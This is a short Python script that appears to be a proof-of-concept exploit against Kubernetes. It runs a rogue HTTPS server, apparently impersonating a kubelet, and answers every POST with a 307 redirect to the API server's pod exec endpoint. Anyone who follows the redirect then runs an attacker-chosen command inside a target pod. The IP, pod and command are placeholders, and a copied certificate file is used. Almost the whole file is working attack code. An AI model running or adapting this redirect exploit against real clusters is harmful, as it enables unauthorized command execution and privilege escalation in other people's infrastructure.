import BaseHTTPServer, SimpleHTTPServer
import ssl

class kubeletHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_POST(self):
        print(self.path)
        master_ip = 'xxx.xxx.xxx.xxx'
        target_pod = 'target_pod_name'
        command = 'command_name_else'
        self.send_response(307);
        self.send_header('Location', 'https://{0}:6443/api/v1/namespaces/default/pods/{1}/exec?command={2}%20from%20{3}&stdout=1&stderr=true'.format(master_ip, target_pod, command, target_pod))
        self.end_headers()


httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 8080), kubeletHandler)
pem_path = 'copied pem file path'
httpd.socket = ssl.wrap_socket (httpd.socket,
                                certfile=pem_path, server_side=True)
httpd.serve_forever()
